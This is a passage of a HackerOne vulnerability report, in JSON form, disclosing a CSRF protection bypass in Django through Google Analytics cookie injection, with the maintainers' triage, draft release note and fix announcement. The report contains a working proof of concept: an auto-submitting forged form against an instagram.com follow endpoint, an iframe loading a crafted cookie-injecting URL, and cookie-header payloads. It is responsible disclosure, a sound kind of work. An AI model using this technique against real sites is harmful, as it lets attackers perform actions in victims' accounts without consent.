            "markdown_message": "<p>I checked locally django 1.9 and django 1.10.<br>\nDjango 1.9 (vulnerable)</p>\n<pre class=\"highlight plaintext\"><code>Cookie: test=test;csrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=&quot;;csrftoken=xxx;\nSet-Cookie:  csrftoken=0wimKaIH8G80FQIS4RTytZHTd4YG7NCF;\n\nCookie: test=test csrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=test\\x0bcsrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=test\\x0ccsrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n</code></pre>\n<p>Django 1.10 (not vulnerable)</p>\n<pre class=\"highlight plaintext\"><code>Cookie: test=test;csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\n\nCookie: test=&quot;;csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\n\nCookie: test=test csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=DFuxUi1LLWPvRo4UGDpKN04fi7fLlKPazescjWpGUTiZ7UfNbKVN5rsq0F3viliq;\n\nCookie: test=test\\x0Bcsrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=vNcLbQhSzhMBvoj4qB74ttCwq9JVwUvblWUSBynOFraVq0A7s899NYZXuCyIcRe8;\n\nCookie: test=test\\x0Ccsrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=X3WYa2flCaPfLmW64okiFlkcmnzzizbcaru78nLwyZnhASpwsu6x6j0ia5dwfzit;\n</code></pre>", 
            "type": "Activities::Comment", 
            "id": 1189534, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-12T23:22:09.702Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-12T23:22:09.702Z", 
            "actor": {
                "username": "timgraham", 
                "url": "/timgraham", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Thanks, I'll start the security release process. How does this look for a release note:\n\nCSRF protection bypass on a site with Google Analytics\n======================================================\n\nAn interaction between Google Analytics and Django's cookie parsing could allow\nan attacker to set arbitrary cookies leading to a bypass of CSRF protection.\n\nThe parser for ``request.COOKIES`` is simplified to better match the behavior\nof browsers and to mitigate this attack. ``request.COOKIES`` may now contain\ncookies that are invalid according to :rfc:`6265` but are possible to set via\n``document.cookie``.", 
            "markdown_message": "<p>Thanks, I&#39;ll start the security release process. How does this look for a release note:</p>\n\n<h1 id=\"csrf-protection-bypass-on-a-site-with-google-analytics\">CSRF protection bypass on a site with Google Analytics</h1>\n\n<p>An interaction between Google Analytics and Django&#39;s cookie parsing could allow<br>\nan attacker to set arbitrary cookies leading to a bypass of CSRF protection.</p>\n\n<p>The parser for <code>request.COOKIES</code> is simplified to better match the behavior<br>\nof browsers and to mitigate this attack. <code>request.COOKIES</code> may now contain<br>\ncookies that are invalid according to :rfc:<code>6265</code> but are possible to set via<br>\n<code>document.cookie</code>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1189975, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-12T23:23:01.413Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-12T23:23:01.413Z", 
            "actor": {
                "username": "timgraham", 
                "url": "/timgraham", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 1189979, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "bobrov", 
                "url": "/bobrov"
            }, 
            "created_at": "2016-09-26T19:11:09.315Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-26T19:11:09.315Z", 
            "actor": {
                "username": "timgraham", 
                "url": "/timgraham", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Released today: https://www.djangoproject.com/weblog/2016/sep/26/security-releases/", 
            "markdown_message": "<p>Released today: <a title=\"https://www.djangoproject.com/weblog/2016/sep/26/security-releases/\" href=\"/redirect?signature=f644709d858816cb161b0abd1b2766a815481255&amp;url=https%3A%2F%2Fwww.djangoproject.com%2Fweblog%2F2016%2Fsep%2F26%2Fsecurity-releases%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.djangoproject.com/weblog/2016/sep/26/security-releases/</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1216924, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-26T19:11:44.497Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-26T19:11:44.497Z", 
            "actor": {
                "username": "timgraham", 
                "url": "/timgraham", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1216925, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-26T19:29:10.907Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-26T19:29:10.907Z", 
            "actor": {
                "username": "bobrov", 
                "url": "/bobrov", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/205/23edda13a2312c012c4935004ad89d8b4709fcb6_medium.jpeg?1389674804"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1216975, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-26T19:29:11.012Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-26T19:29:11.012Z", 
            "actor": {
                "username": "bobrov", 
                "url": "/bobrov", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/205/23edda13a2312c012c4935004ad89d8b4709fcb6_medium.jpeg?1389674804"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1216977, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "bobrov", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/bobrov", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/205/492265dcd1cba57abf1401bf827738afc3565170_small.jpeg?1389674804"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -66627406.364669465, 
    "disclosed_at": "2016-09-26T19:29:10.967Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/26647", 
    "created_at": "2014-09-01T08:28:27.353Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>I shall explain all the steps to create the final PoC in order to be more clear.</p>\n\n<h2 id=\"part-1-cookie-injection-via-google-analytics\">Part 1. Cookie Injection via Google Analytics </h2>\n\n<p>(Reported to Google, rewarded, still working)</p>\n\n<ul>\n<li><p>Google Analytics sets the cookie to track user source:<br>\n<code>__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]</code><br>\nFor example:<br>\n<code>__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/</code></p></li>\n<li><p>User fully controls path in Referer and it is not filtered before being put in __utmz</p></li>\n</ul>\n\n<h2 id=\"part-2-cookie-parsing-peculiarities-by-different-web-servers\">Part 2. Cookie parsing peculiarities by different web servers</h2>\n\n<ul>\n<li><p>A typical Cookie sent by a web browser looks like this: <br>\nCookie: param1=value1; param2=value2;</p></li>\n<li><p>Many web servers accept cookies delimited not only by semicolons but also by commas: <br>\nCookie: param1=value2, param2=value2<br>\nCookie: param1=value2,param2=value2</p></li>\n<li><p>Python + Django handle cookies with incorrect regular expression that allows to use characters [ \\ ] as delimiters: <br>\nCookie: param1=value1]param2=value2</p></li>\n</ul>\n\n<p><a title=\"https://docs.python.org/3/library/http.cookies.html\" href=\"/redirect?signature=935609611f6800d5a50780eeb8d2017d5f8e2a9a&amp;url=https%3A%2F%2Fdocs.python.org%2F3%2Flibrary%2Fhttp.cookies.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://docs.python.org/3/library/http.cookies.html</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"http://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432\" href=\"/redirect?signature=03d83784a902efed1bae68a487de576edad91657&amp;url=http%3A%2F%2Fhg.python.org%2Fcpython%2Ffile%2F3.4%2FLib%2Fhttp%2Fcookies.py%23l432\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"http://tools.ietf.org/html/rfc2109\" href=\"/redirect?signature=13054763010a8e92fd547ca4807249a3e22258a6&amp;url=http%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc2109\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://tools.ietf.org/html/rfc2109</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"http://tools.ietf.org/html/rfc2068\" href=\"/redirect?signature=c9e63ae8679348e3720858bce2bacdb319153efb&amp;url=http%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc2068\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://tools.ietf.org/html/rfc2068</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Example:</p>\n<pre class=\"highlight plaintext\"><code>&gt;&gt;&gt; from http import cookies\n&gt;&gt;&gt; C = cookies.SimpleCookie()\n&gt;&gt;&gt; C.load(&#39;__utmz=blah]csrftoken=x&#39;)\n&gt;&gt;&gt; C\n&lt;SimpleCookie: csrftoken=&#39;x&#39;&gt;\n</code></pre>\n<h2 id=\"part-3-cookie-handling-peculiarities-in-different-web-browsers\">Part 3. Cookie handling peculiarities in different web browsers </h2>\n\n<p>(Reported to Google, won&#39;t fix)</p>\n\n<ul>\n<li><p>For all the web browsers except Safari characters of space, comma, and [ \\ ] can be used as cookie values</p></li>\n<li><p>Chrome handles only a limited number of cookie-attributes, e.g.: <br>\nSet-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;<br>\nwill set cookie for .google.com but not for blah.blah.blah.google.com</p></li>\n</ul>\n\n<h2 id=\"combining-all-these-facts\">Combining all these facts</h2>\n\n<p>Provided that:</p>\n\n<ul>\n<li>A site uses Google Analytics</li>\n<li>This site is hosted by a web server that has some of the aforementioned cookie parsing peculiarities (e.g. Django)</li>\n<li>This site implements Cookie based CSRF protection (a value in Cookie and some request parameter must be equal)</li>\n</ul>\n\n<p>Then:</p>\n\n<ul>\n<li>We can set new arbitrary cookies or redefine the values of existing ones</li>\n<li>This site is vulnerable to CSRF protection bypass</li>\n</ul>\n\n<p>The principal problem of __utmz cookie is that it is set for six months and is not refreshed. This problem can be solved in Google Chrome if you find a subdomain with Google Analytics and rewrite attribute &quot;domain&quot; using the peculiarity that has been described in part 3 with the value &quot;.site.com&quot;.</p>\n\n<p>In other browsers the vulnerability can be exploited by cookie injection at the moment of __utmz refreshing.</p>\n\n<h2 id=\"poc\">PoC</h2>\n\n<p>Vulnerability exploitation on instagram.com with Google Chrome<br>\n(Reported to Facebook, redirected to Django Team)</p>\n\n<ul>\n<li>Open Google Chrome in incognito mode</li>\n<li>Authenticate on instagram.com</li>\n<li>Click the link and wait some seconds</li>\n<li>Result - follow <a title=\"http://instagram.com/black2fan\" href=\"/redirect?signature=aec7297b9151c7d0054369f2ba89032f68bf58cf&amp;url=http%3A%2F%2Finstagram.com%2Fblack2fan\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://instagram.com/black2fan</span><i class=\"icon-external-link\"></i></a>\n</li>\n</ul>\n\n<p><a title=\"http://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html\" href=\"/redirect?signature=7b2d1070cbd97911831c78284d6a2a665f4a8faa&amp;url=http%3A%2F%2Fblackfan.ru%2Ffacebookbugbounty%2Fnouysqaqfbskgobuqkknoitvyqmjgony_instagram.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html</span><i class=\"icon-external-link\"></i></a><br>\nSource:</p>\n<pre class=\"highlight plaintext\"><code>&lt;form \naction=&quot;http://instagram.com/web/friendships/1312928755/follow/?ref=emptyfeed&quot; \nid=&quot;csrf&quot; \nmethod=&quot;POST&quot;&gt;\n      &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;x&quot; /&gt;\n      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;\n&lt;/form&gt;\n\n&lt;script&gt;\n      function xxx() {\n        document.getElementById(&#39;csrf&#39;).submit();\n      }\n&lt;/script&gt;\n\n&lt;iframe \nonload=&quot;xxx()&quot; \nsrc=&quot;http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/&quot;/&gt;\n</code></pre>\n<p>Description:</p>\n\n<ul>\n<li><p>A user authenticates on instagram.com</p></li>\n<li><p>We make him visit the link below assuming that he has not visited blog.instagram.com and he doesn&#39;t have __utmz set on this subdomain:<br>\n<a title=\"http://blackfan.ru/r/,%5Dcsrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/\" href=\"/redirect?signature=e3485532a6c3dec3695cede3c5bda2ad6bd4d402&amp;url=http%3A%2F%2Fblackfan.ru%2Fr%2F%2C%255Dcsrftoken%3Dx%2C%3Bdomain%3D.instagram.com%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3B%3Fr%3Dhttp%3A%2F%2Fblog.instagram.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://blackfan.ru/r/,%5Dcsrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/</span><i class=\"icon-external-link\"></i></a><br>\nCookie is rewritten with new path and domain, as a result cookie is set for .instagram.com:<br>\n__utmz=90378079.1401435337.1.1.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/r/,]csrftoken=x,</p></li>\n<li><p>At this moment request to the web server will make it believe that cookie __utmz consists of incorrect cookie and CSRF token equals to &quot;x&quot;</p></li>\n<li><p>Submit follow form using CSRF-token &quot;x&quot;</p></li>\n</ul>\n", 
    "vulnerability_information": "I shall explain all the steps to create the final PoC in order to be more clear.\r\n\r\nPart 1. Cookie Injection via Google Analytics \r\n---------------------\r\n(Reported to Google, rewarded, still working)\r\n\r\n*   Google Analytics sets the cookie to track user source:\r\n   `__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]`\r\n   For example:\r\n   `__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/`\r\n\r\n*   User fully controls path in Referer and it is not filtered before being put in __utmz\r\n\r\nPart 2. Cookie parsing peculiarities by different web servers\r\n---------------------\r\n*   A typical Cookie sent by a web browser looks like this: \r\n   Cookie: param1=value1; param2=value2;\r\n\r\n*   Many web servers accept cookies delimited not only by semicolons but also by commas: \r\n   Cookie: param1=value2, param2=value2\r\n   Cookie: param1=value2,param2=value2\r\n\r\n*   Python + Django handle cookies with incorrect regular expression that allows to use characters [ \\ ] as delimiters: \r\n   Cookie: param1=value1]param2=value2\r\n\r\nhttps://docs.python.org/3/library/http.cookies.html\r\nhttp://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432\r\nhttp://tools.ietf.org/html/rfc2109\r\nhttp://tools.ietf.org/html/rfc2068\r\n\r\nExample:\r\n```\r\n>>> from http import cookies\r\n>>> C = cookies.SimpleCookie()\r\n>>> C.load('__utmz=blah]csrftoken=x')\r\n>>> C\r\n<SimpleCookie: csrftoken='x'>\r\n```\r\n\r\nPart 3. Cookie handling peculiarities in different web browsers \r\n---------------------\r\n(Reported to Google, won't fix)\r\n*   For all the web browsers except Safari characters of space, comma, and [ \\ ] can be used as cookie values\r\n\r\n*   Chrome handles only a limited number of cookie-attributes, e.g.: \r\n   Set-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;\r\n   will set cookie for .google.com but not for blah.blah.blah.google.com\r\n\r\nCombining all these facts\r\n---------------------\r\n\r\nProvided that:\r\n* A site uses Google Analytics\r\n* This site is hosted by a web server that has some of the aforementioned cookie parsing peculiarities (e.g. Django)\r\n* This site implements Cookie based CSRF protection (a value in Cookie and some request parameter must be equal)\r\n\r\nThen:\r\n* We can set new arbitrary cookies or redefine the values of existing ones\r\n* This site is vulnerable to CSRF protection bypass\r\n\r\n\r\nThe principal problem of __utmz cookie is that it is set for six months and is not refreshed. This problem can be solved in Google Chrome if you find a subdomain with Google Analytics and rewrite attribute \"domain\" using the peculiarity that has been described in part 3 with the value \".site.com\".\r\n\r\nIn other browsers the vulnerability can be exploited by cookie injection at the moment of __utmz refreshing.\r\n\r\nPoC\r\n---------------------\r\n\r\nVulnerability exploitation on instagram.com with Google Chrome\r\n(Reported to Facebook, redirected to Django Team)\r\n\r\n* Open Google Chrome in incognito mode\r\n* Authenticate on instagram.com\r\n* Click the link and wait some seconds\r\n* Result - follow http://instagram.com/black2fan\r\n\r\nhttp://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html\r\nSource:\r\n```\r\n<form \r\naction=\"http://instagram.com/web/friendships/1312928755/follow/?ref=emptyfeed\" \r\nid=\"csrf\" \r\nmethod=\"POST\">\r\n      <input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"x\" />\r\n      <input type=\"submit\" value=\"Submit request\" />\r\n</form>\r\n\r\n<script>\r\n      function xxx() {\r\n        document.getElementById('csrf').submit();\r\n      }\r\n</script>\r\n\r\n<iframe \r\nonload=\"xxx()\" \r\nsrc=\"http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/\"/>\r\n```\r\n\r\nDescription:\r\n*   A user authenticates on instagram.com\r\n\r\n*   We make him visit the link below assuming that he has not visited blog.instagram.com and he doesn't have __utmz set on this subdomain:\r\n   http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/\r\n   Cookie is rewritten with new path and domain, as a result cookie is set for .instagram.com:\r\n   __utmz=90378079.1401435337.1.1.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/r/,]csrftoken=x,\r\n\r\n*   At this moment request to the web server will make it believe that cookie __utmz consists of incorrect cookie and CSRF token equals to \"x\"\r\n\r\n*   Submit follow form using CSRF-token \"x\"\r\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "", 
            "about": "", 
            "twitter_handle": null, 
            "name": "Django"
        }, 
        "handle": "django", 
        "url": "https://hackerone.com/django", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/023/ec31309b47fcebde058694ac605642e4ecb4a5e1_small.png?1383736780", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/023/70440d61685f1c05276b327d184d510c3221fa25_medium.png?1383736780"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 23, 
        "default_currency": "usd"
    }, 
    "is_published": false
}